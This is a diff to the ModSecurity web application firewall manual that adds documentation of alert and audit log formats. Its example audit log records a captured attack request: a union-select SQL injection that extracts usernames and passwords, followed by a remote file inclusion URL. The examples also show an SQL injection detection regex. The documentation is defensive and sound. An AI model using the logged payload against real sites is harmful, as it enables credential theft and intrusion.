@@ -3,10 +3,10 @@
   <title>ModSecurity Reference Manual</title>
 
   <articleinfo>
-    <releaseinfo>Version 2.5.0-rc1/ (December 21, 2007)</releaseinfo>
+    <releaseinfo>Version 2.5.0-rc1/ (January 10, 2008)</releaseinfo>
 
     <copyright>
-      <year>2004-2007</year>
+      <year>2004-2008</year>
 
       <holder>Breach Security, Inc. (<ulink
       url="http://www.breach.com">http://www.breach.com</ulink>)</holder>
@@ -3849,7 +3849,8 @@ SecRule REQUEST_CONTENT_TYPE ^text/xml nolog,pass,<emphasis>ctl:requestBodyProce
         </listitem>
 
         <listitem>
-          <para><literal moreinfo="none">ruleRemoveById</literal></para>
+          <para><literal moreinfo="none">ruleRemoveById</literal> (single rule ID, or a
+          single rule ID range accepted as parameter)</para>
         </listitem>
 
         <listitem>
@@ -5259,6 +5260,255 @@ SecRule XML "<emphasis>@validateSchema /path/to/apache2/conf/xml.xsd</emphasis>,
 
 SecAction "pass,setvar:'tx.allowed_methods=get,post,head'"
 SecRule REQUEST_METHOD "!<emphasis>@within %{tx.allowed_methods}</emphasis>" t:lowercase,deny,status:403</programlisting>
+    </section>
+  </section>
+
+  <section>
+    <title>Data Formats</title>
+
+    <para>This section documents the various data formats used by
+    ModSecurity.</para>
+
+    <section>
+      <title>Alerts</title>
+
+      <para>Below is an example of a ModSecurity alert entry. It is always
+      contained on a single line but we've broken it here into multiple lines
+      for readability.</para>
+
+      <programlisting>Access denied with code 505 (phase 1). Match of "rx ^HTTP/(0\\\\.9|1\\\\.[01])$"
+against "REQUEST_PROTOCOL" required. [id "960034"] [msg "HTTP protocol version
+is not allowed by policy"] [severity "CRITICAL"] [uri "/"] [unique_id
+"PQaTTVBEUOkAAFwKXrYAAAAM"]</programlisting>
+
+      <para>Each alert entry begins with the engine message:</para>
+
+      <programlisting>Access denied with code 505 (phase 1). Match of "rx ^HTTP/(0\\\\.9|1\\\\.[01])$"
+against "REQUEST_PROTOCOL" required.</programlisting>
+
+      <para>The engine message consist of two parts. The first part tells you
+      whether ModSecurity acted to interrupt transaction or rule processing.
+      If it did nothing the first part of the message will simply say
+      "Warning". If an action was taken then one of the following messages
+      will be used:</para>
+
+      <itemizedlist>
+        <listitem>
+          <para><emphasis>Access denied with code %0</emphasis> - a response
+          with status code %0 was sent.</para>
+        </listitem>
+
+        <listitem>
+          <para><emphasis>Access denied with connection close</emphasis> -
+          connection was abruptly closed.</para>
+        </listitem>
+
+        <listitem>
+          <para><emphasis>Access denied with redirection to %0 using status
+          %1</emphasis> - a redirection to URI %0 was issued using status
+          %1.</para>
+        </listitem>
+
+        <listitem>
+          <para><emphasis>Access allowed</emphasis> - rule engine stopped
+          processing rules (transaction was unaffected).</para>
+        </listitem>
+
+        <listitem>
+          <para><emphasis>Access to phase allowed</emphasis> - rule engine
+          stopped processing rules in the current phase only. Subsequent
+          phases will be processed normally. Transaction was not affected by
+          this rule but it may be affected by any of the rules in the
+          subsequent phase.</para>
+        </listitem>
+
+        <listitem>
+          <para><emphasis>Access to request allowed</emphasis> - rule engine
+          stopped processing rules in the current phase. Phases prior to
+          request execution in the backend (currently phases 1 and 2) will not
+          be processed. The response phases (currently phases 3 and 4) and
+          others (currently phase 5) will be processed as normal. Transaction
+          was not affected by this rule but it may be affected by any of the
+          rules in the subsequent phase.</para>
+        </listitem>
+      </itemizedlist>
+
+      <para>The second part of the engine message explains
+      <emphasis>why</emphasis> was the event generated. Since it is
+      automatically generated from the rules it will be very technical in
+      nature talking about operators and their parameters and give you insight
+      into what the rule looked like. But this message cannot give you insight
+      into the reasoning behind the rule. A well-written rule will always
+      specify a human-readable message (using the <literal>msg</literal>
+      action) to provide further clarification.</para>
+
+      <para>The metadata fields are always placed at the end of the alert
+      entry. Each metadata field is a text fragment that consists of an open
+      bracket followed by the metadata field name, followed by the value and
+      the closing bracket. What follows is the text fragment that makes up the
+      <literal>id</literal> metadata field.</para>
+
+      <programlisting>[id "960034"]</programlisting>
+
+      <para>The following metadata fields are currently used:</para>
+
+      <orderedlist>
+        <listitem>
+          <para><literal>id</literal> - Unique rule ID, as specified by the
+          <literal>id</literal> action.</para>
+        </listitem>
+
+        <listitem>
+          <para><literal>rev</literal> - Rule revision, as specified by the
+          <literal>rev</literal> action.</para>
+        </listitem>
+
+        <listitem>
+          <para><literal>msg</literal> - Human-readable message, as specified
+          by the <literal>msg</literal> action.</para>
+        </listitem>
+
+        <listitem>
+          <para><literal>severity</literal> - Event severity, as specified by
+          the <literal>severity</literal> action.</para>
+        </listitem>
+
+        <listitem>
+          <para><literal>unique_id</literal> - Unique event ID, generated
+          automatically.</para>
+        </listitem>
+
+        <listitem>
+          <para><literal>uri</literal> - Request URI.</para>
+        </listitem>
+
+        <listitem>
+          <para><literal>logdata</literal> - contains transaction data
+          fragment, as specified by the <literal>logdata</literal>
+          action.</para>
+        </listitem>
+      </orderedlist>
+
+      <section>
+        <title>Alerts in Apache</title>
+
+        <para>Every ModSecurity alert conforms to the following format when it
+        appears in the Apache error log:</para>
+
+        <programlisting>[Sun Jun 24 10:19:58 2007] [error] [client 192.168.0.1] ModSecurity: ALERT_MESSAGE</programlisting>
+
+        <para>The above is a standard Apache error log format. The
+        "ModSecurity:" prefix is specific to ModSecurity. It is used to allow
+        quick identification of ModSecurity alert messages when they appear in
+        the same file next to other Apache messages.</para>
+
+        <para>The actual message (<literal>ALERT_MESSAGE</literal> in the
+        example above) is in the same format as described in the
+        <emphasis>Alerts</emphasis> section.</para>
+      </section>
+
+      <section>
+        <title>Alerts in Audit Log</title>
+
+        <para>Alerts are transported in the <literal>H</literal> section of
+        the ModSecurity Audit Log. Alerts will appear each on a separate line
+        and in the order they were generated by ModSecurity. Each line will be
+        in the following format:</para>
+
+        <programlisting>Message: ALERT_MESSAGE</programlisting>
+
+        <para>Below is an example of an entire <literal>H</literal> section
+        (followed by the <literal>Z</literal> section terminator):</para>
+
+        <programlisting>--c7036611-H--
+Message: Warning. Match of "rx ^apache.*perl" against "REQUEST_HEADERS:User-Agent" required. [id "990011"]
+ [msg "Request Indicates an automated program explored the site"] [severity "NOTICE"]
+Message: Warning. Pattern match "(?:\\b(?:(?:s(?:elect\\b(?:.{1,100}?\\b(?:(?:length|count|top)\\b.{1,100}
+ ?\\bfrom|from\\b.{1,100}?\\bwhere)|.*?\\b(?:d(?:ump\\b.*\\bfrom|ata_type)|(?:to_(?:numbe|cha)|inst)r))|p_
+ (?:(?:addextendedpro|sqlexe)c|(?:oacreat|prepar)e|execute(?:sql)?|makewebt ..." at ARGS:c. [id "950001"]
+ [msg "SQL Injection Attack. Matched signature: union select"] [severity "CRITICAL"]
+Stopwatch: 1199881676978327 2514 (396 2224 -)
+Producer: ModSecurity v2.x.x (Apache 2.x)
+Server: Apache/2.x.x
+
+--c7036611-Z--</programlisting>
+      </section>
+    </section>
+
+    <section>
+      <title>Audit Log</title>
+
+      <para>ModSecurity records one transaction in a single audit log file.
+      Below is an example:</para>
+
+      <programlisting>--c7036611-A--
+[09/Jan/2008:12:27:56 +0000] OSD4l1BEUOkAAHZ8Y3QAAAAH 209.90.77.54 64995 80.68.80.233 80
+--c7036611-B--
+GET //EvilBoard_0.1a/index.php?c='/**/union/**/select/**/1,concat(username,char(77),
+ password,char(77),email_address,char(77),info,char(77),user_level,char(77))/**/from
+ /**/eb_members/**/where/**/userid=1/*http://kamloopstutor.com/images/banners/on.txt?
+ HTTP/1.1
+TE: deflate,gzip;q=0.3
+Connection: TE, close
+Host: www.thinkingstone.com
+User-Agent: libwww-perl/5.808
+
+--c7036611-F--
+HTTP/1.1 404 Not Found
+Content-Length: 223
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+--c7036611-H--
+Message: Warning. Match of "rx ^apache.*perl" against "REQUEST_HEADERS:User-Agent" required. [id "990011"]
+ [msg "Request Indicates an automated program explored the site"] [severity "NOTICE"]
+Message: Warning. Pattern match "(?:\\b(?:(?:s(?:elect\\b(?:.{1,100}?\\b(?:(?:length|count|top)\\b.{1,100}
+ ?\\bfrom|from\\b.{1,100}?\\bwhere)|.*?\\b(?:d(?:ump\\b.*\\bfrom|ata_type)|(?:to_(?:numbe|cha)|inst)r))|p_
+ (?:(?:addextendedpro|sqlexe)c|(?:oacreat|prepar)e|execute(?:sql)?|makewebt ..." at ARGS:c. [id "950001"]
+ [msg "SQL Injection Attack. Matched signature &lt;union select&gt;"] [severity "CRITICAL"]
+Apache-Error: [file "/tmp/buildd/apache2-2.0.54/build-tree/apache2/server/core.c"] [line 3505] [level 3]
+ File does not exist: /var/www/EvilBoard_0.1a
+Stopwatch: 1199881676978327 2514 (396 2224 -)
+Producer: ModSecurity v2.x.x (Apache 2.x)
+Server: Apache/2.x.x
+
+--c7036611-Z--
+</programlisting>
+
+      <para>The file consist of multiple sections, each in different format.
+      Separators are used to define sections:</para>
+
+      <programlisting>--c7036611-A--</programlisting>
+
+      <para>A separator always begins on a new line and conforms to the
+      following format:</para>
+
+      <orderedlist>
+        <listitem>
+          <para>Two dashes</para>
+        </listitem>
+
+        <listitem>
+          <para>Unique boundary, which consists from several hexadecimal
+          characters.</para>
+        </listitem>
+
+        <listitem>
+          <para>One dash character.</para>
+        </listitem>
+
+        <listitem>
+          <para>Section identifier, currently a single uppercase letter.
+          </para>
+        </listitem>
+
+        <listitem>
+          <para>Two trailing dashes.</para>
+        </listitem>
+      </orderedlist>
+
+      <para>Refer to the documenation for <literal>SecAuditLogParts</literal>
+      for the explanation of each part.</para>
     </section>
   </section>
 
